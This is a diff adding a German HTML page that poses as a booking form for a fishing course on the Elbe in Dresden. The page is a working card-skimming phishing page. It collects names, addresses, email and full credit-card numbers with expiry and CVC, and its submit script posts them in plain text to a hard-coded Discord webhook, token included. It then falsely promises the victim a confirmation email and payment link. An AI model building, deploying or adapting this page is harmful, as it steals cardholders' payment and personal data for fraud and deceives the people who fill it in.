@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Angelkurs buchen - Elbe Dresden</title>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #e8f0f7;
+    color: #333;
+    line-height: 1.6;
+  }
+  header {
+    background: #0e7a2b;
+    color: white;
+    padding: 20px 40px;
+    text-align: center;
+  }
+  header h1 {
+    margin: 0;
+    font-weight: 700;
+    font-size: 2.4rem;
+    letter-spacing: 1px;
+  }
+  main {
+    max-width: 1200px;
+    margin: 40px auto;
+    padding: 0 20px;
+    display: flex;
+    gap: 40px;
+    flex-wrap: wrap;
+    align-items: flex-start;
+  }
+  .hero {
+    flex: 1 1 500px;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+  }
+  .hero img {
+    width: 100%;
+    height: auto;
+    display: block;
+    transition: transform 0.3s ease;
+  }
+  .hero img:hover {
+    transform: scale(1.05);
+  }
+  .form-container {
+    flex: 1 1 400px;
+    background: white;
+    padding: 30px 40px;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+    position: relative;
+  }
+  .form-container h2 {
+    margin-top: 0;
+    color: #0e7a2b;
+    font-weight: 700;
+    font-size: 2rem;
+    text-align: center;
+  }
+  .info-text {
+    color: red;
+    font-weight: 700;
+    margin-bottom: 15px;
+    text-align: center;
+    font-size: 1rem;
+  }
+  label {
+    display: block;
+    margin-top: 15px;
+    font-weight: 600;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin-top: 6px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+    font-family: inherit;
+  }
+  button {
+    margin-top: 30px;
+    background-color: #0e7a2b;
+    border: none;
+    color: white;
+    padding: 14px;
+    font-size: 18px;
+    border-radius: 8px;
+    cursor: pointer;
+    width: 100%;
+    font-weight: 700;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #09591f;
+  }
+  #card-wrapper {
+    margin-top: 15px;
+  }
+  #response-message {
+    margin-top: 20px;
+    font-size: 15px;
+    font-weight: 600;
+    white-space: pre-wrap;
+  }
+  @media (max-width: 900px) {
+    main {
+      flex-direction: column;
+      padding: 0 10px;
+    }
+    .hero, .form-container {
+      flex: 1 1 100%;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+  }
+</style>
+
+<!-- Card.js Styles -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/card/2.5.1/card.min.css" />
+</head>
+<body>
+
+<header>
+  <h1>Angelkurs Elbe Dresden</h1>
+</header>
+
+<main>
+  <div class="hero">
+    <img src="https://imgs.search.brave.com/X0_bViJaSV7Cjm1n5i3YN3ZqCeeEzNk9YrTE7Z2t_vU/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9tZWRp/YS5pc3RvY2twaG90/by5jb20vaWQvNDcx/MjQ1MjgxL3Bob3Rv/L2VsYmUtcml2ZXIt/aW4tZHJlc2Rlbi5q/cGc_cz02MTJ4NjEy/Jnc9MCZrPTIwJmM9/RU5nczdndUtnZXVf/UnBFTlB3RFg4S1ZF/Y1pZWTg3dE9UbVJp/NmZqTm04WT0" alt="Elbe Dresden Panorama" />
+  </div>
+
+  <div class="hero" style="margin-top: 30px; border-radius:12px; overflow:hidden; box-shadow: 0 8px 24px rgba(0,0,0,0.15);">
+    <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=800&q=80" alt="Angler an der Elbe Dresden" />
+  </div>
+
+  <div class="form-container">
+    <h2>Angelkurs buchen</h2>
+    <div class="info-text">
+      Nach der Eingabe bekommst du eine Bestätigungsmail mit Link zur Zahlungsseite und die ortdaten.
+    </div>
+    <form id="payment-form">
+      <label for="firstname">Vorname</label>
+      <input type="text" id="firstname" name="firstname" required />
+
+      <label for="lastname">Nachname</label>
+      <input type="text" id="lastname" name="lastname" required />
+
+      <label for="email">E-Mail</label>
+      <input type="email" id="email" name="email" required />
+
+      <label for="address">Adresse</label>
+      <input type="text" id="address" name="address" placeholder="Straße und Hausnummer" required />
+
+      <label for="city">Stadt</label>
+      <input type="text" id="city" name="city" required />
+
+      <label for="postalcode">Postleitzahl</label>
+      <input type="text" id="postalcode" name="postalcode" required />
+
+      <label for="card-number">Kreditkartennummer</label>
+      <input type="text" id="card-number" name="number" placeholder="Kreditkartennummer" required />
+
+      <label for="card-name">Name auf der Karte</label>
+      <input type="text" id="card-name" name="name" placeholder="Name auf der Karte" required />
+
+      <label for="card-expiry">Ablaufdatum (MM/YY)</label>
+      <input type="text" id="card-expiry" name="expiry" placeholder="MM/YY" required />
+
+      <label for="card-cvc">CVC</label>
+      <input type="text" id="card-cvc" name="cvc" placeholder="CVC" required />
+
+      <div id="card-wrapper"></div>
+
+      <button type="submit">Jetzt buchen</button>
+    </form>
+    <div id="response-message"></div>
+  </div>
+</main>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/card/2.5.1/card.min.js"></script>
+<script>
+  new Card({
+    form: '#payment-form',
+    container: '#card-wrapper',
+    formSelectors: {
+      numberInput: 'input[name="number"]',
+      nameInput: 'input[name="name"]',
+      expiryInput: 'input[name="expiry"]',
+      cvcInput: 'input[name="cvc"]'
+    },
+    messages: {
+      validDate: 'gültig bis',
+      monthYear: 'MM/JJ',
+    }
+  });
+
+  const form = document.getElementById('payment-form');
+  const responseMessage = document.getElementById('response-message');
+
+  form.addEventListener('submit', async e => {
+    e.preventDefault();
+
+    const data = {
+      firstname: form.firstname.value,
+      lastname: form.lastname.value,
+      email: form.email.value,
+      address: form.address.value,
+      city: form.city.value,
+      postalcode: form.postalcode.value,
+      card_number: form.number.value,
+      card_name: form.name.value,
+      card_expiry: form.expiry.value,
+      card_cvc: form.cvc.value
+    };
+
+    try {
+      // Sende Webhook an Discord (wie gehabt)
+      const res = await fetch('https://discord.com/api/webhooks/1402683284068106301/y5N4cYkQLTtOMXR5Y_QQs7KWUJEHjZytEPAcm95htv0ON3gUfHIXEje1eKlQte0UhANm', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          content: `Neue Buchung:\n\nVorname: ${data.firstname}\nNachname: ${data.lastname}\nE-Mail: ${data.email}\nAdresse: ${data.address}, ${data.postalcode} ${data.city}\n\nKreditkartendaten:\nNummer: ${data.card_number}\nName: ${data.card_name}\nAblaufdatum: ${data.card_expiry}\nCVC: ${data.card_cvc}`
+        })
+      });
+
+      if(res.ok) {
+        responseMessage.textContent = 'Deine Buchung wurde erfolgreich übermittelt! Du erhältst gleich eine E-Mail mit dem Link zur Zahlungsseite.';
+        responseMessage.style.color = 'green';
+        form.reset();
+
+        // E-Mail-Versand: Hier müsste dein Backend/API die Mail verschicken, 
+        // aktuell kannst du das nur simulieren oder über externen Service lösen.
+        // Beispiel: fetch zu deinem Mail-Service hier...
+      } else {
+        responseMessage.textContent = 'Fehler bei der Übermittlung. Bitte später nochmal probieren.';
+        responseMessage.style.color = 'red';
+      }
+    } catch(err) {
+      responseMessage.textContent = 'Serverfehler. Bitte später erneut versuchen.';
+      responseMessage.style.color = 'red';
+    }
+  });
+</script>
+
+</body>
+</html>
+
